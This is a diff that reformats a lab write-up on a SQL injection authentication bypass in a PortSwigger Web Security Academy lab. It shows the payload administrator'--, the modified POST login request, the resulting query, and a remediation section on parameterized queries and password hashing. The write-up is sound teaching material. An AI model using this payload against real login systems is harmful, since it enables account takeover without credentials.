@@ -26,11 +26,11 @@ Exploit an in-band SQL injection vulnerability in the authentication endpoint (`
 
 **Inferred Backend SQL Query:**
 ```sql
-```
 
 SELECT * FROM users WHERE username = 'administrator' AND password = 'password123'
+```
 
-3. Exploitation & Proof of Concept (PoC)
+## 3. Exploitation & Proof of Concept (PoC)
 To authenticate as administrator without knowing the password, the payload must:
 
 Supply the target account name (administrator) followed by a single quote (') to close the string literal early.
@@ -43,28 +43,28 @@ Username: administrator'--
 Password: anything123 (ignored by the SQL parser)
 
 Modified HTTP Request
-HTTP
+```
 POST /login HTTP/2
 Host: <lab-id>.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
 
 csrf=[REDACTED]&username=administrator'--&password=anything123
 Resulting SQL Query Executed on Backend:
-
-SQL
 SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything123'
+```
 Proof of Exploitation Screenshots
 1. Login Form Submission with administrator'-- Payload:
+ ![Login Form Payload](../screenshots/sqli-02.png)
 
-2. Authenticated Administrator Session & Lab Completion Banner:
+3. Authenticated Administrator Session & Lab Completion Banner:
+   ![PortSwigger Lab Solved Confirmation](../screenshots/sqli-02-solved.png)
 
-4. Impact
+## 4. Impact
 An unauthenticated attacker can bypass authentication controls entirely and gain full administrative account takeover (administrator), exposing privileged functionality and user data without credentials.
 
-5. Remediation
+## 5. Remediation
 Primary Fix (Parameterized Queries): Use prepared statements with bound parameters for all authentication queries so user input is never interpreted as SQL syntax:
-
-Python
-# Secure Python Example
+```
 cursor.execute("SELECT id, password_hash FROM users WHERE username = %s", (username,))
+```
 Secure Password Verification: Fetch the user record by username using a parameterized query first, then verify the submitted password against a strong cryptographic hash (bcrypt or Argon2) in application code rather than comparing plaintext passwords inside SQL.
